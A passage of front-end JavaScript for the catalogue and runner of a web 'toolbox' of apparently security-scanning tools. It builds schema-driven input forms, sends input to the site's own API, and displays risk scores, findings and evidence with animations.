    if (exText) { const ex = el("span", "tb-card-ex"); ex.append(el("b", "", L().tbExLabel + " "), el("code", "", exText)); ex.dir = "auto"; body.append(ex); }
    const meta = el("span", "tb-card-meta", tool.paste_only ? L().tbPasteOnly : catName(tool.category));
    c.append(ico, body, meta);
    c.addEventListener("click", () => open(tool));
    c.addEventListener("pointermove", (e) => { const r = c.getBoundingClientRect(); c.style.setProperty("--mx", `${e.clientX - r.left}px`); c.style.setProperty("--my", `${e.clientY - r.top}px`); });
    cardFor.set(tool.id, c);
    return c;
  }
  /* a short usage example per tool, from the same safe sample data the "Try an example" button fills */
  function usageExample(tool) {
    const props = (tool.input && tool.input.properties) || {};
    const req = (tool.input && tool.input.required) || [];
    const names = [...req, ...Object.keys(props).filter((n) => !req.includes(n))].filter((n) => n !== "source");
    for (const n of names) {
      const v = example(n, props[n] || {}, tool);
      if (v === undefined) continue;
      if (/base64$/.test(n)) return L().tbExFile;
      if (Array.isArray(v) && v.length && v[0] && typeof v[0] === "object" && v[0].path) return L().tbExFiles.replace("{f}", v[0].path);
      const txt = typeof v === "string" ? v : Array.isArray(v) ? v.map((x) => (typeof x === "string" ? x : JSON.stringify(x))).join(", ") : JSON.stringify(v);
      const one = txt.replace(/\s+/g, " ").trim();
      return one.length > 64 ? `${one.slice(0, 62)}…` : one;
    }
    return "";
  }
  function renderMap() {
    const l = L();
    mapBox.replaceChildren();
    l.tbUses.forEach(([key, title, sub], gi) => {
      const list = catalog.tools.filter((x) => (USE_OF[catOf(x)] || "file") === key);
      if (!list.length) return;
      const sec = el("section", "tb-use");
      sec.style.setProperty("--h", catHue(catOf(list[0])));
      const h = el("h2", "tb-use-title");
      h.append(el("span", "tb-use-n", String(gi + 1).padStart(2, "0")), document.createTextNode(title), el("small", "", ` · ${list.length}`));
      const g = el("div", "tb-grid");
      g.append(...list.map(card));
      sec.append(h, el("p", "tb-use-sub", sub), g);
      mapBox.append(sec);
    });
  }
  function renderGrid() {
    if (!catalog) return;
    const q = query.trim().toLowerCase();
    const grouped = viewMode === "use" && filterCat === "all" && !q;
    mapBox.hidden = !grouped; grid.hidden = grouped;
    if (grouped) { renderMap(); empty.hidden = true; return; }
    const list = catalog.tools.filter((x) => (filterCat === "all" || catOf(x) === filterCat) &&
      (!q || `${x.name} ${x.description} ${tName(x)} ${tDesc(x)} ${catName(x.category)} ${x.id}`.toLowerCase().includes(q)));
    const first = new Map([...grid.children].map((n) => [n, n.getBoundingClientRect()]));
    const nodes = list.map(card);
    grid.replaceChildren(...nodes);
    empty.hidden = list.length > 0;
    if (reduced()) return;
    nodes.forEach((n, i) => {
      const a = first.get(n);
      if (a) {
        const b = n.getBoundingClientRect(), dx = a.left - b.left, dy = a.top - b.top;
        if (dx || dy) n.animate([{ transform: `translate(${dx}px, ${dy}px)` }, { transform: "none" }], { duration: 480, easing: "cubic-bezier(.22,1,.36,1)" });
      } else {
        n.animate([{ opacity: 0, transform: "translateY(18px) scale(.96)" }, { opacity: 1, transform: "none" }], { duration: 520, delay: Math.min(i, 24) * 22, easing: "cubic-bezier(.22,1,.36,1)", fill: "backwards" });
      }
    });
  }
  search.addEventListener("input", () => { query = search.value; renderGrid(); });

  /* ---------- the constellation (time-driven) ---------- */
  let cRaf = 0, hoverCat = null;
  const nodes = () => (catalog ? [...new Set(catalog.tools.map(catOf))] : []);
  function drawConstellation(now) {
    cRaf = 0;
    if (view.hidden || !constel.isConnected) return;
    const dpr = Math.min(devicePixelRatio || 1, 2), w = constel.clientWidth, h = constel.clientHeight;
    if (!w) return;
    if (constel.width !== Math.round(w * dpr)) { constel.width = Math.round(w * dpr); constel.height = Math.round(h * dpr); }
    const x = constel.getContext("2d"); x.setTransform(dpr, 0, 0, dpr, 0, 0); x.clearRect(0, 0, w, h);
    const t = reduced() ? 0 : now / 1000, cx = w / 2, cy = h / 2, R = Math.min(w, h) * 0.38, list = nodes();
    // core
    const g = x.createRadialGradient(cx, cy, 0, cx, cy, R * 0.55);
    g.addColorStop(0, "rgba(79,224,255,.55)"); g.addColorStop(0.4, "rgba(180,108,255,.18)"); g.addColorStop(1, "rgba(0,0,0,0)");
    x.fillStyle = g; x.beginPath(); x.arc(cx, cy, R * 0.55, 0, 6.283); x.fill();
    x.strokeStyle = "rgba(160,200,255,.18)"; x.lineWidth = 1;
    [0.62, 1].forEach((k, i) => { x.beginPath(); x.ellipse(cx, cy, R * k, R * k * 0.62, t * 0.05 * (i ? -1 : 1), 0, 6.283); x.stroke(); });
    const pts = list.map((c, i) => {
      const a = (i / list.length) * 6.283 + t * 0.12, rr = R * (i % 2 ? 1 : 0.8);
      return { c, x: cx + Math.cos(a) * rr, y: cy + Math.sin(a) * rr * 0.62, z: Math.sin(a) };
    });
    pts.sort((a, b) => a.z - b.z).forEach((p) => {
      const hue = catHue(p.c), on = filterCat === p.c || hoverCat === p.c, n = catalog.tools.filter((q) => catOf(q) === p.c).length;
      x.strokeStyle = `hsla(${hue},90%,65%,${on ? 0.7 : 0.2})`; x.beginPath(); x.moveTo(cx, cy); x.lineTo(p.x, p.y); x.stroke();
      // a pulse travelling out along each spoke
      const k = (t * 0.6 + p.z) % 1; x.fillStyle = `hsla(${hue},95%,70%,${0.8 * (1 - k)})`;
      x.beginPath(); x.arc(cx + (p.x - cx) * k, cy + (p.y - cy) * k, 2, 0, 6.283); x.fill();
      const r = 4 + Math.sqrt(n) * 2.6 + (on ? 4 : 0);
      const gl = x.createRadialGradient(p.x, p.y, 0, p.x, p.y, r * 2.6);
      gl.addColorStop(0, `hsla(${hue},95%,70%,${on ? 0.9 : 0.6})`); gl.addColorStop(1, `hsla(${hue},95%,60%,0)`);
      x.fillStyle = gl; x.beginPath(); x.arc(p.x, p.y, r * 2.6, 0, 6.283); x.fill();
      x.fillStyle = `hsl(${hue},95%,${on ? 80 : 68}%)`; x.beginPath(); x.arc(p.x, p.y, r * 0.55, 0, 6.283); x.fill();
      p.r = r * 1.4;
    });
    constel._pts = pts;
    if (!reduced()) cRaf = requestAnimationFrame(drawConstellation);
  }
  const startConstellation = () => { if (!cRaf) cRaf = requestAnimationFrame(drawConstellation); };
  const hit = (e) => { const r = constel.getBoundingClientRect(), px = e.clientX - r.left, py = e.clientY - r.top; return (constel._pts || []).find((p) => Math.hypot(p.x - px, p.y - py) < Math.max(14, p.r)); };
  constel.addEventListener("pointermove", (e) => { const p = hit(e); hoverCat = p ? p.c : null; constel.style.cursor = p ? "pointer" : ""; constel.title = p ? catName(p.c) : ""; if (reduced()) drawConstellation(0); });
  constel.addEventListener("click", (e) => { const p = hit(e); if (p) setFilter(filterCat === p.c ? "all" : p.c); });

  /* ---------- the runner ---------- */
  function fieldKind(name, s) {
    if (s.type === "string" && /base64$/.test(name)) return "file";
    if (s.type === "array" && s.items && s.items.type === "object" && s.items.properties && s.items.properties.path && s.items.properties.content) return "files";
    if (s.type === "array" && s.items && (s.items.type === "integer" || s.items.type === "number")) return "nums";
    if (s.enum) return "enum";
    if (s.type === "boolean") return "bool";
    if (s.type === "integer" || s.type === "number") return "num";
    if (s.type === "array" && (!s.items || s.items.type === "string")) return "lines";
    if (s.type === "object" && (name === "headers" || (s.additionalProperties && s.additionalProperties.type === "string"))) return "headers";
    if (s.type === "string") return (s.maxLength && s.maxLength <= 300) || /url|domain|name|version|cipher|record|zone|host|cookie/.test(name) ? "line" : "text";
    return "json";
  }
  function open(tool, fromRoute) {
    current = tool;
    const l = L(), props = (tool.input && tool.input.properties) || {}, req = new Set((tool.input && tool.input.required) || []);
    const box = el("div", "tb-run-box"); box.style.setProperty("--h", catHue(tool.category));
    const top = el("div", "tb-run-top");
    const back = el("button", "tb-back", l.tbBack); back.type = "button"; back.addEventListener("click", close);
    const ico = el("span", "tb-card-ico"); ico.append(svgIcon(CATS[tool.category] ? CATS[tool.category].icon : ""));
    const title = el("div", "tb-run-title");
    const tn = el("h2", "", tName(tool)), td = el("p", "", tDesc(tool)); tn.dir = td.dir = "auto";
    title.append(el("small", "", `${catName(tool.category)} · ${l.tbVersion} ${tool.version}`), tn, td);
    const badges = el("div", "tb-badges");
    if (!tool.processing.executes_files) badges.append(el("span", "tb-badge", l.tbPrivacyLocal));
    if (!tool.processing.network) badges.append(el("span", "tb-badge", l.tbPrivacyNet));
    title.append(badges);
    top.append(back, ico, title);
    const form = el("form", "tb-form"); form.noValidate = true;
    const getters = {};
    if (tool.paste_only) { badges.append(el("span", "tb-badge", l.tbPasteOnly)); form.append(el("p", "tb-paste-note", l.tbPasteNote)); }
    Object.entries(props).forEach(([name, s]) => {
      if (tool.paste_only && name === "source") return;    // the website reads only what is pasted
      const kind = fieldKind(name, s);
      const wrap = el("label", `tb-field k-${kind}`);
      const lab = el("span", "tb-field-name", fName(name) + (req.has(name) ? " *" : ""));
      const hint = s.description || (kind === "lines" ? l.tbLines : kind === "headers" ? l.tbHeaders : kind === "json" ? l.tbJson : "");
      wrap.append(lab);
      let input;
      if (kind === "files") {
        // files as people have them: a name and the contents, typed or pasted, or read from disk
        const boxF = el("div", "tb-files");
        const listF = el("div", "tb-file-list");
        const picker = el("input"); picker.type = "file"; picker.multiple = true; picker.hidden = true;
        const rows = [];
        const addRow = (path = "", content = "") => {
          const row = el("div", "tb-file-row");
          const head = el("div", "tb-file-head");
          const pathIn = el("input", "tb-in"); pathIn.type = "text"; pathIn.dir = "ltr"; pathIn.value = path; pathIn.placeholder = l.tbFilePathPh; pathIn.setAttribute("aria-label", l.tbFilePath);
          const rm = el("button", "ghost small tb-file-rm", "×"); rm.type = "button"; rm.setAttribute("aria-label", l.tbRemoveFile); rm.title = l.tbRemoveFile;
          rm.addEventListener("click", () => { if (rows.length > 1) { rows.splice(rows.indexOf(row), 1); row.remove(); } else { pathIn.value = ""; ta.value = ""; } });
          head.append(pathIn, rm);
          const ta = el("textarea", "tb-in"); ta.rows = 6; ta.dir = "ltr"; ta.value = content; ta.placeholder = l.tbFileContent; ta.setAttribute("aria-label", l.tbFileContent);
          row.append(head, ta);
          row.pathIn = pathIn; row.ta = ta;
          rows.push(row); listF.append(row);
          return row;
        };
        addRow();
        const btnRow = el("div", "tb-file-btns");
        const more = el("button", "ghost small", l.tbAddFile); more.type = "button";
        more.addEventListener("click", () => addRow().pathIn.focus());
        const pick = el("button", "ghost small", l.tbPickFiles); pick.type = "button";
        pick.addEventListener("click", () => picker.click());
        picker.addEventListener("change", async () => {
          for (const f of [...picker.files].slice(0, 50)) {
            const text = await f.text().catch(() => "");
            const empty = rows.find((r) => !r.pathIn.value && !r.ta.value);
            const r = empty || addRow();
            r.pathIn.value = f.name; r.ta.value = text;
          }
          picker.value = "";
        });
        btnRow.append(pick, more, picker);
        boxF.append(listF, btnRow);
        wrap.append(boxF);
        getters[name] = () => {
          const out = rows.filter((r) => r.ta.value.trim()).map((r, i) => ({ path: r.pathIn.value.trim() || `file-${i + 1}.txt`, content: r.ta.value }));
          return out.length ? out : undefined;
        };
        getters[name].set = (v) => { rows.splice(0).forEach((r) => r.remove()); (Array.isArray(v) ? v : [v]).forEach((x) => addRow(x.path || "", x.content || "")); };
        input = null;
      } else if (kind === "file") {
        const drop = el("div", "tb-drop"); drop.tabIndex = 0;
        const fi = el("input"); fi.type = "file"; fi.hidden = true;
        const msg = el("span", "tb-drop-msg", l.tbDrop);
        const ta = el("textarea", "tb-in"); ta.rows = 3; ta.placeholder = l.tbOrText;
        let b64 = "";
        const setFile = (f) => {
          if (!f) return;
          const max = (catalog && catalog.max_body) ? catalog.max_body * 0.72 : 4e6;
          if (f.size > max) { msg.textContent = `${f.name}: ${Math.round(f.size / 1e6)} MB > ${Math.round(max / 1e6)} MB`; return; }
          const rd = new FileReader();
          rd.onload = () => { b64 = String(rd.result).split(",")[1] || ""; msg.textContent = `${f.name} · ${f.size.toLocaleString()} B`; drop.classList.add("has"); const fn = form.querySelector('[data-name="file_name"]'); if (fn && !fn.value) fn.value = f.name; };
          rd.readAsDataURL(f);
        };
        drop.addEventListener("click", () => fi.click());
        drop.addEventListener("keydown", (e) => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); fi.click(); } });
        fi.addEventListener("change", () => setFile(fi.files[0]));
        drop.addEventListener("dragover", (e) => { e.preventDefault(); drop.classList.add("over"); });
        drop.addEventListener("dragleave", () => drop.classList.remove("over"));
        drop.addEventListener("drop", (e) => { e.preventDefault(); drop.classList.remove("over"); setFile(e.dataTransfer.files[0]); });
        drop.append(svgIcon("M12 16V4M7 9l5-5 5 5M4 16v3a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-3"), msg, fi);
        wrap.append(drop, ta);
        getters[name] = () => (b64 || (ta.value ? enc(ta.value) : undefined));
        getters[name].set = (v) => { b64 = ""; ta.value = decodeURIComponent(escape(atob(v))); drop.classList.remove("has"); msg.textContent = l.tbDrop; };
        input = ta;
      } else if (kind === "enum") {
        input = el("select", "tb-in"); s.enum.forEach((v) => { const o = el("option", "", String(v)); o.value = String(v); input.append(o); });
        getters[name] = () => input.value;
      } else if (kind === "bool") {
        input = el("input", "switch"); input.type = "checkbox"; input.checked = !!s.default;
        getters[name] = () => input.checked;
      } else if (kind === "num") {
        input = el("input", "tb-in"); input.type = "number"; if (s.minimum != null) input.min = s.minimum; if (s.maximum != null) input.max = s.maximum;
        getters[name] = () => (input.value === "" ? undefined : Number(input.value));
      } else if (kind === "line") {
        input = el("input", "tb-in"); input.type = "text"; input.dir = "ltr";
        getters[name] = () => input.value.trim() || undefined;
      } else {
        input = el("textarea", "tb-in"); input.rows = kind === "text" ? 6 : 4; input.dir = "ltr";
        getters[name] = () => {
          const v = input.value; if (!v.trim()) return undefined;
          if (kind === "lines") return v.split(/\r?\n/).map((x) => x.trim()).filter(Boolean);
          if (kind === "nums") return v.split(/[\s,]+/).map((x) => Number(x)).filter((x) => Number.isFinite(x));
          if (kind === "headers") { const o = {}; v.split(/\r?\n/).forEach((line) => { const i = line.indexOf(":"); if (i > 0) o[line.slice(0, i).trim()] = line.slice(i + 1).trim(); }); return o; }
          if (kind === "json") { try { return JSON.parse(v); } catch { return v; } }
          return v;
        };
      }
      if (input && kind !== "file") { input.dataset.name = name; wrap.append(input); }
      wrap.dataset.field = name;
      if (hint) wrap.append(el("small", "tb-hint", hint));
      getters[name].kind = kind; getters[name].input = input;
      form.append(wrap);
    });
    const actions = el("div", "tb-actions");
    const go = el("button", "primary tb-go", l.tbRun); go.type = "submit";
    const ex = el("button", "ghost tb-ex", l.tbExample); ex.type = "button";
    // an example is offered when it fills every required field
    const hasExample = Object.entries(props).some(([n, s]) => example(n, s, tool) !== undefined) && [...req].every((n) => example(n, props[n] || {}, tool) !== undefined);
    ex.hidden = !hasExample;
    ex.addEventListener("click", () => {
      Object.entries(props).forEach(([n, s]) => {
        const v = example(n, s, tool), g = getters[n]; if (v === undefined || !g) return;
        if (g.kind === "file" || g.kind === "files") g.set(v);
        else if (g.kind === "lines" || g.kind === "nums") g.input.value = (Array.isArray(v) ? v : [v]).join("\n");
        else if (g.kind === "headers") g.input.value = Object.entries(v).map(([k, val]) => `${k}: ${val}`).join("\n");
        else if (g.kind === "json") g.input.value = JSON.stringify(v, null, 2);
        else if (g.input) g.input.value = typeof v === "string" ? v : JSON.stringify(v);
        if (g.input) { g.input.classList.remove("filled"); void g.input.offsetWidth; g.input.classList.add("filled"); }
      });
      if (window.CSSfx) CSSfx.play("pluck", { k: 4 });
    });
    actions.append(go, ex);
    form.append(actions);
    const out = el("div", "tb-out");
    const formMsg = el("p", "tb-form-msg"); formMsg.setAttribute("role", "alert"); formMsg.hidden = true;
    form.insertBefore(formMsg, actions);
    form.addEventListener("input", () => { formMsg.hidden = true; form.querySelectorAll(".tb-field.invalid").forEach((w) => { w.classList.remove("invalid"); const m = w.querySelector(".tb-err"); if (m) m.remove(); }); });
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      // the form checks itself before anything is sent: required fields, or at least one field for tools with none required
      form.querySelectorAll(".tb-field.invalid").forEach((w) => { w.classList.remove("invalid"); const m = w.querySelector(".tb-err"); if (m) m.remove(); });
      const missing = [...req].filter((n) => getters[n] && getters[n]() === undefined);
      if (missing.length) {
        missing.forEach((n) => { const w = form.querySelector(`[data-field="${n}"]`); if (w) { w.classList.add("invalid"); w.append(el("small", "tb-err", l.tbRequired)); } });
        formMsg.textContent = l.tbFixFields; formMsg.hidden = false;
        const first = form.querySelector(`[data-field="${missing[0]}"] input:not([type=file]), [data-field="${missing[0]}"] textarea, [data-field="${missing[0]}"] select, [data-field="${missing[0]}"] .tb-drop`);
        if (first) first.focus();
        return;
      }
      const given = Object.entries(getters).filter(([, g]) => !["bool", "enum", "num"].includes(g.kind) && g() !== undefined);
      if (!given.length && Object.keys(props).length) { formMsg.textContent = l.tbNeedOne; formMsg.hidden = false; return; }
      formMsg.hidden = true;
      execute(tool, getters, out, go);
    });
    box.append(top, form, out);
    runner.replaceChildren(box);
    // the tool takes the stage; the catalog waits (and comes back where it was)
    if (!shell.hidden) savedY = scrollY;
    runner.hidden = false; shell.hidden = true;
    if (!reduced()) box.animate([{ opacity: 0, transform: "translateY(26px) scale(.98)", filter: "blur(6px)" }, { opacity: 1, transform: "none", filter: "none" }], { duration: 560, easing: "cubic-bezier(.22,1,.36,1)" });
    scrollTo({ top: 0, behavior: "auto" });
    if (window.CSSfx) CSSfx.play("open");
    const hash = `#/toolbox/${encodeURIComponent(tool.id)}`;
    if (!fromRoute && location.hash !== hash) history.pushState({ tbTool: tool.id }, "", hash);
  }
  let savedY = 0;
  function close(fromRoute) {
    if (!fromRoute && history.state && history.state.tbTool && /^#\/toolbox\//.test(location.hash)) { history.back(); return; }   // the popstate below closes it
    if (!current && runner.hidden) return;
    runner.hidden = true; shell.hidden = false; current = null;
    requestAnimationFrame(() => scrollTo({ top: savedY, behavior: "auto" }));
    if (!reduced()) shell.animate([{ opacity: 0, transform: "translateY(16px)" }, { opacity: 1, transform: "none" }], { duration: 420, easing: "cubic-bezier(.22,1,.36,1)" });
    if (!fromRoute && /^#\/toolbox\//.test(location.hash)) history.replaceState(null, "", "#/toolbox");
    if (window.CSSfx) CSSfx.play("close");
  }
  // the address decides: #/toolbox/<id> shows that tool, anything else shows the catalog
  function syncRoute() {
    const m = location.hash.match(/^#\/toolbox\/(.+)$/);
    if (m && catalog) { const tool = catalog.tools.find((x) => x.id === decodeURIComponent(m[1])); if (tool && (!current || current.id !== tool.id)) open(tool, true); return; }
    if (!m && current) close(true);
  }
  window.addEventListener("popstate", syncRoute);
  window.addEventListener("hashchange", syncRoute);

  /* ---------- running: the analysis stage, then the result ---------- */
  async function execute(tool, getters, out, go) {
    const l = L(), input = {};
    Object.entries(getters).forEach(([n, g]) => { const v = g(); if (v !== undefined) input[n] = v; });
    go.disabled = true; go.textContent = l.tbRunning;
    const stage = el("div", "tb-stage");
    const ring = el("div", "tb-ring"); ring.append(el("i"), el("i"), el("i"));
    const log = el("ol", "tb-log");
    stage.append(el("div", "tb-beam"), ring, log);
    out.replaceChildren(stage);
    stage.scrollIntoView({ behavior: reduced() ? "auto" : "smooth", block: "center" });
    if (window.CSSfx) CSSfx.play("rise");
    let li = 0;
    const tick = setInterval(() => { if (li < l.tbLog.length) { const x = el("li", "", `› ${l.tbLog[li++]}`); log.append(x); } }, reduced() ? 0 : 230);
    const minShow = new Promise((r) => setTimeout(r, reduced() ? 0 : 1250));      // long enough to read what happens
    let res, err;
    try { [res] = await Promise.all([CS.postJSON("/api/toolbox/run", { tool: tool.id, input }), minShow]); }
    catch (e) { err = e; await minShow; }
    clearInterval(tick);
    go.disabled = false; go.textContent = l.tbAgain;
    if (err || !res || res.status !== "ok") {
      const raw = err ? String((err.response && err.response.error && err.response.error.message) || err.message || "") : String((res && res.error && res.error.message) || "");
      const field = /\$\.(\w+)/.exec(raw);
      const msg = field ? l.tbFieldProblem.replace("{f}", fName(field[1])) : (err && !err.status) || (err && err.status >= 500) ? CS.friendlyError(err) : l.tbBadInput;
      out.replaceChildren(errorBox(msg));
      if (window.CSSfx) CSSfx.play("close");
      return;
    }
    const rr = res.result || {};
    if (rr.status === "invalid_input" || /^input rejected/i.test(String(rr.summary || ""))) {
      // the tool said what it needs: name those fields the way the form does
      const props = (tool.input && tool.input.properties) || {};
      const named = Object.keys(props).filter((n) => new RegExp(`\\b${n}\\b`).test(String(rr.summary || ""))).map(fName);
      out.replaceChildren(errorBox(named.length ? l.tbNeedOneOf.replace("{f}", named.join(" \u00b7 ")) : l.tbNeedOne, l.tbRejectedTitle));
      if (window.CSSfx) CSSfx.play("close");
      return;
    }
    out.replaceChildren(resultBox(res));
    out.scrollIntoView({ behavior: reduced() ? "auto" : "smooth", block: "start" });
  }
  function errorBox(msg, title) {
    const b = el("div", "tb-error"); b.setAttribute("role", "alert"); b.append(el("b", "", title || L().tbErr), el("p", "", msg)); return b;
  }
  function resultBox(res) {
    const l = L(), r = res.result || {}, cls = String(r.classification || r.status || "unknown").toLowerCase();
    const risk = Math.max(0, Math.min(100, Number(r.risk_score) || 0));
    const tone = risk >= 50 || cls === "malicious" || cls === "suspicious" ? "bad" : risk > 0 || cls === "review" ? "warn" : cls === "clean" ? "ok" : "neutral";
    const box = el("div", `tb-result t-${tone}`);
    // the dial
    const dial = el("div", "tb-dial");
    dial.innerHTML = '<svg viewBox="0 0 120 120" aria-hidden="true"><circle class="trk" cx="60" cy="60" r="50"/><circle class="val" cx="60" cy="60" r="50" pathLength="100"/></svg>';
    const num = el("b", "tb-dial-n", "0"); const cap = el("small", "", l.tbRisk);
    dial.append(num, cap);
    const sum = el("div", "tb-sum");
    sum.append(el("small", "", l.tbResult), el("h3", "", (l.tbCls[cls] || cls)), el("p", "tb-time", l.tbIn.replace("{ms}", res.elapsed_ms ?? "")));
    if (r.summary) sum.append(el("p", "tb-summary", r.summary));
    const top = el("div", "tb-res-top"); top.append(dial, sum);
    box.append(top);
    // findings
    const fs = Array.isArray(r.findings) ? r.findings : [];
    const sevOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };
    fs.sort((a, b) => (sevOrder[a.severity] ?? 5) - (sevOrder[b.severity] ?? 5));
    const fl = el("div", "tb-findings");
    fl.append(el("h4", "", `${l.tbFindings} (${fs.length})`));
    if (!fs.length) fl.append(el("p", "tb-nofind", ["unknown", "error", "partial"].includes(cls) ? l.tbInconclusive : l.tbNoFindings));
    fs.forEach((f, i) => {
      const sev = String(f.severity || "info").toLowerCase();
      const item = el("details", `tb-f s-${sev}`); if (i < 3) item.open = true;
      const sm = el("summary");
      const ft = el("b", "", f.label || f.title || f.id || "—"); ft.dir = "auto";
      sm.append(el("span", "tb-sev", l.tbSev[sev] || sev), ft);
      if (Number(f.contribution) > 0) sm.append(el("span", "tb-contrib", `+${f.contribution}`));
      item.append(sm);
      // three tool families name the explanation differently
      const d = f.detail || f.description || f.explanation || f.message;
      if (d) { const p = el("p", "", d); p.dir = "auto"; item.append(p); }
      if (f.recommendation) { const p = el("p", "tb-rec"); p.append(el("b", "", `${l.tbFix}: `), document.createTextNode(f.recommendation)); item.append(p); }
      if (f.location) item.append(el("p", "tb-loc", typeof f.location === "string" ? f.location : JSON.stringify(f.location)));
      if (f.evidence != null) { const pre = el("pre", "tb-ev"); pre.textContent = typeof f.evidence === "string" ? f.evidence : JSON.stringify(f.evidence, null, 2); item.append(pre); }
      item.style.setProperty("--i", i);
      fl.append(item);
    });
    box.append(fl);
    // evidence and raw
    if (Array.isArray(r.evidence) && r.evidence.length) {
      const ev = el("details", "tb-evidence"); ev.append(el("summary", "", `${l.tbEvidence} (${r.evidence.length})`));
      const ul = el("ul"); r.evidence.slice(0, 40).forEach((x) => ul.append(el("li", "", typeof x === "string" ? x : JSON.stringify(x)))); ev.append(ul); box.append(ev);
    }
    const raw = el("details", "tb-raw"); raw.append(el("summary", "", l.tbRaw));
    const pre = el("pre"); pre.textContent = JSON.stringify(r, null, 2);
    const copy = el("button", "ghost tb-copy", l.tbCopy); copy.type = "button";
    copy.addEventListener("click", () => { navigator.clipboard && navigator.clipboard.writeText(pre.textContent).then(() => { copy.textContent = l.tbCopied; setTimeout(() => { copy.textContent = l.tbCopy; }, 1400); }); });
    raw.append(copy, pre); box.append(raw);
    // motion: the dial fills and counts, findings arrive one by one
    const val = dial.querySelector(".val");
    if (reduced()) { val.style.strokeDashoffset = String(100 - risk); num.textContent = risk; }
    else {
      requestAnimationFrame(() => { val.style.strokeDashoffset = String(100 - risk); });
      const t0 = performance.now(); const step = (now) => { const k = Math.min(1, (now - t0) / 1100); num.textContent = Math.round(risk * (1 - Math.pow(1 - k, 3))); if (k < 1) requestAnimationFrame(step); }; requestAnimationFrame(step);
      box.animate([{ opacity: 0, transform: "translateY(20px)" }, { opacity: 1, transform: "none" }], { duration: 520, easing: "cubic-bezier(.22,1,.36,1)" });
    }
    if (window.CSSfx) CSSfx.play(tone === "bad" ? "stamp" : tone === "ok" ? "success" : "chime");
    return box;
  }

  /* ---------- loading and routing ---------- */
  async function load() {
    if (loaded) return;
    loaded = true;
    try { catalog = await api("/api/toolbox"); }
    catch (e) { loaded = false; grid.replaceChildren(errorBox(String(e.message || e))); return; }
    paintHead(); buildChips(); renderGrid(); startConstellation();
    syncRoute();
  }
  function onShow() { if (!view.hidden) { load(); startConstellation(); } }
  new MutationObserver(onShow).observe(view, { attributes: true, attributeFilter: ["hidden"] });
  CS.onLang(() => { paintHead(); if (catalog) { buildChips(); cardFor.clear(); renderGrid(); if (current) open(current, true); } });
  paintHead();
  onShow();
})();
